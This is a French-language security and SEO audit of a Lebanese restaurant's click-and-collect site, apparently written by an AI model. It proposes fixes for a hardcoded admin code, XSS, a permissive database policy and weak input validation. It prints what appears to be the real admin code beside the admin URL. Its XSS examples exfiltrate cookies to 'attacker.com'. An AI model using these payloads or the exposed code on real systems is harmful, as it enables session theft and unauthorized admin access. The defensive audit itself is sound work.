# 🔒 AUDIT DE SÉCURITÉ COMPLET - BEYROUTH EXPRESS
**Date :** 6 mars 2026
**Site :** https://beyrouth.express
**Admin :** https://beyrouth.express/gestion-be-2026/
**Auditeur :** Claude Sonnet 4.5

---

## 🚨 VULNÉRABILITÉS CRITIQUES (À CORRIGER IMMÉDIATEMENT)

### 1. 🔴 CODE ADMIN HARDCODÉ EN CLAIR

**Fichiers concernés :**
- `/gestion-be-2026/login.html` ligne 97
- `/gestion-be-2026/index.html` ligne 836

**Problème :**
```javascript
const ADMIN_CODE = 'A5qYIeJatg';
```

**Impact :** N'importe qui peut voir le code admin en consultant le code source de la page (Ctrl+U ou F12). **Accès complet à l'admin sans authentification.**

**Vecteurs d'attaque :**
1. Attaquant ouvre `https://beyrouth.express/gestion-be-2026/login.html`
2. Clique droit → Afficher le code source
3. Cherche "ADMIN_CODE" → trouve `A5qYIeJatg`
4. Entre le code → Accès total à l'admin (commandes, clients, stats)

**Severity :** 🔴 **CRITIQUE** - Contournement total de l'authentification

**Solutions :**

**Option 1 (Rapide) :** Supprimer le code du frontend, utiliser Edge Function
```typescript
// supabase/functions/admin-auth/index.ts (DÉJÀ EXISTE !)
const ADMIN_CODE = Deno.env.get('ADMIN_CODE') // Stocké dans secrets Supabase

// login.html - Appeler l'Edge Function au lieu de valider côté client
async function login() {
  const code = document.getElementById('codeInput').value.trim();

  const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-auth`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    },
    body: JSON.stringify({ code })
  });

  const data = await response.json();

  if (data.success) {
    localStorage.setItem('adminToken', data.token); // Token JWT, pas le code
    window.location.href = './index.html';
  } else {
    // Erreur
  }
}
```

**Option 2 (Mieux) :** Utiliser Supabase Auth avec email/password
- Créer un utilisateur admin dans Supabase Auth
- Utiliser `supabase.auth.signInWithPassword()`
- RLS policies basées sur `auth.uid()`

**Option 3 (Idéal) :** Combinaison des deux
- Auth Supabase pour les admins principaux
- Code PIN temporaire (24h) pour la tablette, stocké en base avec expiration

---

### 2. 🔴 XSS (CROSS-SITE SCRIPTING) - MULTIPLES POINTS

#### **A. Affichage des commandes (commande.html:387)**

**Code vulnérable :**
```javascript
details.innerHTML = html; // html contient item.nom et item.components NON échappés
```

**Vecteur d'attaque :**
1. Attaquant modifie directement la base Supabase (si RLS mal configuré) OU exploite une autre faille
2. Insère un nom de plat malveillant :
```sql
UPDATE menu_items
SET nom = '<img src=x onerror="fetch(''https://attacker.com/steal?c=''+document.cookie)">'
WHERE id = 1;
```
3. Quand un client commande ce plat et consulte sa commande → XSS exécuté
4. Cookie de session volé → Attaquant peut se connecter à l'admin

**Impact :** Vol de session admin, injection de code malveillant, redirection vers site de phishing

---

#### **B. Génération de facture PDF (commande.html:480)**

**Code vulnérable :**
```javascript
const html = await response.text(); // HTML brut depuis Edge Function
const win = window.open('', '_blank');
win.document.write(html); // DANGEREUX - aucune validation
win.document.close();
```

**Problème :** `document.write()` après chargement = réécriture complète du document. Si l'Edge Function `generate-invoice-pdf` ne sanitise pas correctement les données (client_prenom, items.nom, notes), un attaquant peut injecter du JavaScript qui s'exécutera dans le nouvel onglet.

**Vecteur d'attaque :**
```javascript
// Client saisit dans "Notes" :
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      origin: window.location.href,
      cookies: document.cookie
    })
  });
</script>
```

Si la facture PDF contient cette note non échappée → Code exécuté dans le PDF.

---

#### **C. Email de confirmation (send-order-confirmation/index.ts:65-90)**

**Code vulnérable :**
```typescript
const itemsHtml = order.items.map((item: any) => {
  return `
    <tr>
      <td>${item.quantite}x ${item.nom}</td>  ❌ Pas d'échappement
      <td>${(item.prix * item.quantite).toFixed(2)}€</td>
    </tr>
  `;
}).join('');
```

**Impact :** Si un attaquant contrôle `menu_items.nom`, il peut injecter du HTML/JS dans l'email envoyé au client ET à l'admin. Certains clients email (Outlook, Gmail web) exécutent du JavaScript limité ou chargent des images (pixel tracking).

---

#### **D. Panel Admin - Affichage client (gestion-be-2026/index.html:1690)**

**Code vulnérable :**
```javascript
<div>${order.client_prenom || 'Client'}</div>  ❌ Pas d'échappement
<div>${order.client_telephone || ''}</div>
```

**Vecteur :** Client saisit un prénom malveillant :
```
Prénom : <img src=x onerror='alert(document.cookie)'>
```

Quand l'admin ouvre le dashboard → XSS exécuté dans le contexte admin → Peut voler le token admin.

---

**Solutions XSS :**

**1. Utiliser `textContent` au lieu de `innerHTML` :**
```javascript
// ❌ DANGEREUX
element.innerHTML = `<div>${user_input}</div>`;

// ✅ SÛR
const div = document.createElement('div');
div.textContent = user_input; // Échappe automatiquement le HTML
element.appendChild(div);
```

**2. Échapper manuellement le HTML :**
```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

element.innerHTML = `<div>${escapeHtml(user_input)}</div>`;
```

**3. Utiliser DOMPurify (bibliothèque de sanitization) :**
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
<script>
  element.innerHTML = DOMPurify.sanitize(user_input);
</script>
```

**4. Pour `document.write()` - Remplacer par Blob :**
```javascript
// ❌ DANGEREUX
win.document.write(html);

// ✅ MIEUX
const blob = new Blob([sanitizedHtml], { type: 'text/html' });
const url = URL.createObjectURL(blob);
window.open(url, '_blank');
```

---

### 3. 🔴 RLS POLICY TROP PERMISSIVE

**Fichier :** `supabase-schema.sql` ligne 131

**Policy actuelle :**
```sql
CREATE POLICY "orders_select_by_numero" ON orders FOR SELECT USING (true);
```

**Problème :** Cette policy permet à **N'IMPORTE QUI** de lire **TOUTES** les commandes sans restriction.

**Vecteur d'attaque :**
```javascript
// N'importe quel utilisateur peut exécuter :
const { data } = await supabase
  .from('orders')
  .select('*'); // Récupère TOUTES les commandes (clients, emails, téléphones, etc.)
```

**Impact :**
- Vol de données clients (RGPD)
- Analyse des ventes concurrents
- Spam/phishing avec emails clients

**Solution :**
```sql
-- ❌ SUPPRIMER
DROP POLICY "orders_select_by_numero" ON orders;

-- ✅ CRÉER (restreindre par numéro de commande)
CREATE POLICY "orders_select_own" ON orders FOR SELECT
USING (
  numero = current_setting('request.jwt.claims', true)::json->>'order_numero'
  OR auth.role() = 'authenticated'
);
```

Ou mieux : utiliser une Edge Function pour valider que l'utilisateur connaît le numéro de commande avant de retourner les données.

---

### 4. 🟠 VALIDATION D'INPUTS INSUFFISANTE

#### **Email (index.html:1438)**
```javascript
// ❌ FAIBLE
if (!email.includes('@') || !email.includes('.')) {
  showToast('⚠️ Email invalide', 'error');
  return;
}
```

**Accepte :** `@.`, `user@domain..com`, `test@.com`, `@@@@@.@@@`

**Solution :**
```javascript
// ✅ STRICT (RFC 5322 simplifié)
function validateEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}
```

#### **Téléphone (index.html:1435)**
```javascript
const phone = document.getElementById('clientPhone').value.trim();
if (!phone) { /* ... */ }
```

**Problème :** Accepte n'importe quoi : `abc`, `<script>`, symboles

**Solution :**
```javascript
function validatePhone(phone) {
  // Format français : 0612345678 ou +33612345678
  return /^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/.test(phone);
}
```

#### **Prénom (index.html:1434)**
```javascript
const name = document.getElementById('clientName').value.trim();
if (!name) { /* ... */ }
```

**Problème :** Accepte HTML/JS

**Solution :**
```javascript
function validateName(name) {
  // Lettres, espaces, tirets, apostrophes uniquement
  return /^[a-zA-ZÀ-ÿ\s'-]{2,50}$/.test(name);
}
```

#### **Notes**
**Problème :** Aucune validation, aucune limite de longueur

**Solution :**
```html
<textarea id="clientNote" maxlength="500" required></textarea>
```
```javascript
const note = document.getElementById('clientNote').value.trim();
if (note.length > 500) {
  showToast('⚠️ Note trop longue (500 caractères max)', 'error');
  return;
}
```

---

### 5. 🟠 PAS DE HEADERS DE SÉCURITÉ HTTP

**Test effectué :**
```bash
curl -I https://beyrouth.express
```

**Headers manquants :**
- `Content-Security-Policy` (CSP)
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Strict-Transport-Security` (HSTS)
- `Referrer-Policy`
- `Permissions-Policy`

**Impact :**
- Site peut être mis dans une iframe (clickjacking)
- Pas de protection contre XSS (CSP)
- Pas de force HTTPS (HSTS)

**Solution (GitHub Pages) :**
GitHub Pages ne permet pas de configurer les headers directement. Utiliser **Cloudflare** (gratuit) comme proxy devant GitHub Pages :

1. Ajouter beyrouth.express sur Cloudflare
2. Configurer Page Rules pour ajouter les headers :
```
Content-Security-Policy: default-src 'self' https://xbuftfwcyontgqbbrrjt.supabase.co https://cdn.jsdelivr.net https://api.paygreen.fr; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://paygreen.fr; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:;
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 🟡 PROBLÈMES DE LOGIQUE / BUGS

### 1. Auto-Accept sans vérification de capacité

**Fichier :** `gestion-be-2026/index.html` + `paygreen-webhook/index.ts`

**Problème :** Si auto-accept est activé, TOUTES les commandes sont acceptées automatiquement dès le paiement, même si :
- Le restaurant est fermé
- La cuisine est débordée
- Un ingrédient est en rupture

**Solution :** Ajouter des conditions :
```javascript
// Auto-accept SEULEMENT si :
// - Heures d'ouverture (11h-14h30, 18h-22h)
// - Moins de 10 commandes en attente
// - Tous les ingrédients disponibles
```

---

### 2. Pas de limite de commandes simultanées

**Problème :** Un attaquant (ou client) peut passer 100 commandes en 1 minute → DDoS de la cuisine

**Solution :** Rate limiting côté Edge Function `create-payment` :
```typescript
// Limiter à 3 commandes par IP par heure
const { data: recentOrders } = await supabase
  .from('orders')
  .select('id')
  .eq('client_email', email)
  .gte('created_at', new Date(Date.now() - 3600000).toISOString());

if (recentOrders && recentOrders.length >= 3) {
  return new Response(JSON.stringify({
    error: 'Vous avez déjà passé 3 commandes dans l\'heure. Veuillez patienter.'
  }), { status: 429 });
}
```

---

### 3. Numéro de commande prévisible

**Format actuel :** 4 chiffres + 2 lettres (ex: 4728 KP)

**Problème :** 6,760,000 combinaisons = facilement bruteforçable pour deviner les numéros de commande d'autres clients

**Vecteur :** Attaquant teste `0000 AA`, `0000 AB`, etc. jusqu'à trouver des commandes valides → Peut consulter les commandes des autres

**Solution :**
1. Ajouter un hash dans l'URL :
```
https://beyrouth.express/commande.html?num=4728KP&token=abc123def456
```
2. Ou utiliser UUID :
```javascript
const orderNum = crypto.randomUUID(); // 36 caractères, impossible à deviner
```

---

## 📊 SEO - PROBLÈMES IDENTIFIÉS

### 1. ❌ Fichiers SEO manquants

**Manquants :**
- `robots.txt`
- `sitemap.xml`

**Impact :** Google n'indexe pas efficacement le site

**Solution :**

**`robots.txt` (à créer à la racine) :**
```
User-agent: *
Allow: /
Disallow: /gestion-be-2026/
Disallow: /commande.html
Disallow: /confirmation.html

Sitemap: https://beyrouth.express/sitemap.xml
```

**`sitemap.xml` :**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://beyrouth.express/</loc>
    <lastmod>2026-03-06</lastmod>
    <priority>1.0</priority>
    <changefreq>daily</changefreq>
  </url>
  <url>
    <loc>https://beyrouth.express/traiteur/</loc>
    <lastmod>2026-03-06</lastmod>
    <priority>0.8</priority>
    <changefreq>weekly</changefreq>
  </url>
</urlset>
```

---

### 2. ❌ Meta Tags incomplets

**Actuel (index.html:3-5) :**
```html
<title>A Beyrouth — Click & Collect | La Défense</title>
<meta name="description" content="Commandez en ligne chez A Beyrouth à La Défense. Cuisine libanaise authentique, retrait express.">
```

**Manquants :**
- Meta OpenGraph (Facebook, LinkedIn)
- Twitter Cards
- Keywords
- Canonical URL
- Alternate (mobile)

**Solution complète :**
```html
<!-- SEO de base -->
<title>A Beyrouth — Restaurant Libanais La Défense | Click & Collect</title>
<meta name="description" content="Restaurant libanais A Beyrouth à La Défense Courbevoie. Commandez en ligne : shawarma, mezze, grillades. Retrait express. Cartes restaurant acceptées (Swile, Restoflash, Conecs).">
<meta name="keywords" content="restaurant libanais, la défense, courbevoie, click and collect, shawarma, mezze, houmous, falafel, carte restaurant, swile, ticket restaurant">
<link rel="canonical" href="https://beyrouth.express/">

<!-- OpenGraph (Facebook, LinkedIn) -->
<meta property="og:type" content="restaurant">
<meta property="og:title" content="A Beyrouth — Restaurant Libanais La Défense">
<meta property="og:description" content="Cuisine libanaise authentique à La Défense. Commandez en ligne, retirez en 15 min. Cartes restaurant acceptées.">
<meta property="og:url" content="https://beyrouth.express/">
<meta property="og:image" content="https://beyrouth.express/img/og-image.jpg">
<meta property="og:site_name" content="A Beyrouth">
<meta property="og:locale" content="fr_FR">

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="A Beyrouth — Restaurant Libanais La Défense">
<meta name="twitter:description" content="Cuisine libanaise authentique à La Défense. Commandez en ligne.">
<meta name="twitter:image" content="https://beyrouth.express/img/twitter-card.jpg">

<!-- Restaurant specifique -->
<meta property="restaurant:contact_info:street_address" content="4 Esplanade du Général de Gaulle">
<meta property="restaurant:contact_info:locality" content="Courbevoie">
<meta property="restaurant:contact_info:postal_code" content="92400">
<meta property="restaurant:contact_info:country_name" content="France">
```

---

### 3. ❌ Structured Data (JSON-LD) manquant

**Impact :** Pas de rich snippets Google (étoiles, horaires, localisation dans les résultats)

**Solution :**
```html
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Restaurant",
  "name": "A Beyrouth",
  "image": "https://beyrouth.express/img/restaurant.jpg",
  "description": "Restaurant libanais à La Défense, cuisine authentique, click & collect",
  "address": {
    "@type": "PostalAddress",
    "streetAddress": "4 Esplanade du Général de Gaulle, Sortie 4 du métro",
    "addressLocality": "Courbevoie",
    "addressRegion": "Île-de-France",
    "postalCode": "92400",
    "addressCountry": "FR"
  },
  "geo": {
    "@type": "GeoCoordinates",
    "latitude": 48.8920,
    "longitude": 2.2380
  },
  "url": "https://beyrouth.express",
  "telephone": "+33-X-XX-XX-XX-XX",
  "servesCuisine": "Libanaise",
  "priceRange": "€€",
  "openingHoursSpecification": [
    {
      "@type": "OpeningHoursSpecification",
      "dayOfWeek": ["Monday","Tuesday","Wednesday","Thursday","Friday"],
      "opens": "11:00",
      "closes": "14:30"
    },
    {
      "@type": "OpeningHoursSpecification",
      "dayOfWeek": ["Monday","Tuesday","Wednesday","Thursday","Friday"],
      "opens": "18:00",
      "closes": "22:00"
    }
  ],
  "acceptsReservations": "False",
  "paymentAccepted": "Carte bancaire, Swile, Restoflash, Conecs"
}
</script>
```

---

### 4. 🟡 Performance - Images non optimisées

**Vérification :**
```bash
ls -lh img/*.jpg | head -5
```

**Recommandations :**
1. Compresser toutes les images (TinyPNG, ImageOptim)
2. Convertir en WebP pour navigateurs modernes :
```html
<picture>
  <source srcset="img/shawarma.webp" type="image/webp">
  <img src="img/shawarma.jpg" alt="Shawarma poulet">
</picture>
```
3. Lazy loading :
```html
<img src="img/plat.jpg" loading="lazy" alt="...">
```
4. Responsive images :
```html
<img srcset="img/plat-400w.jpg 400w, img/plat-800w.jpg 800w"
     sizes="(max-width: 600px) 400px, 800px"
     src="img/plat-800w.jpg">
```

---

## ✅ POINTS POSITIFS

1. ✅ HTTPS activé (GitHub Pages)
2. ✅ Mobile viewport configuré
3. ✅ Supabase RLS activé sur toutes les tables
4. ✅ CORS configuré correctement (limité à beyrouth.express)
5. ✅ Service Role Key utilisé côté Edge Functions (pas exposé)
6. ✅ Webhook PayGreen sécurisé avec HMAC
7. ✅ Validation de disponibilité des plats avant paiement
8. ✅ Type hints HTML5 (type="email", type="tel")
9. ✅ PWA configuré pour l'admin (manifest.json)

---

## 📋 RÉCAPITULATIF DES ACTIONS PRIORITAIRES

### 🔴 URGENT (Corriger cette semaine)

1. **Supprimer le code admin hardcodé** → Utiliser Edge Function `admin-auth`
2. **Corriger les XSS** → Remplacer `innerHTML` par `textContent` ou échapper HTML
3. **Restreindre la RLS policy orders** → Empêcher lecture de toutes les commandes
4. **Ajouter validation stricte email/téléphone/prénom**

### 🟠 IMPORTANT (Corriger ce mois-ci)

5. **Ajouter rate limiting** sur les commandes (max 3/heure par IP)
6. **Sécuriser le numéro de commande** (ajouter token ou utiliser UUID)
7. **Configurer Cloudflare** pour ajouter headers de sécurité
8. **Créer robots.txt et sitemap.xml**

### 🟡 AMÉLIORATIONS (Planifier)

9. **Ajouter Structured Data JSON-LD** pour SEO
10. **Optimiser les images** (WebP, lazy loading, compression)
11. **Ajouter meta OpenGraph et Twitter Cards**
12. **Implémenter CSP strict**
13. **Ajouter monitoring des erreurs** (Sentry, LogRocket)

---

## 🛠️ FICHIERS À MODIFIER

```
CRITIQUE :
├── gestion-be-2026/login.html (ligne 97 - supprimer ADMIN_CODE)
├── gestion-be-2026/index.html (ligne 836 - supprimer ADMIN_CODE)
├── commande.html (ligne 387, 480 - XSS)
├── confirmation.html (ligne 455 - XSS)
├── index.html (ligne 1434-1440 - validations)
└── supabase-schema.sql (ligne 131 - RLS policy)

IMPORTANT :
├── robots.txt (à créer)
├── sitemap.xml (à créer)
├── index.html (meta tags SEO)
└── supabase/functions/create-payment/index.ts (rate limiting)

AMÉLIORATIONS :
├── index.html (JSON-LD, OpenGraph)
└── img/*.jpg (optimisation)
```

---

**FIN DU RAPPORT** 🔒
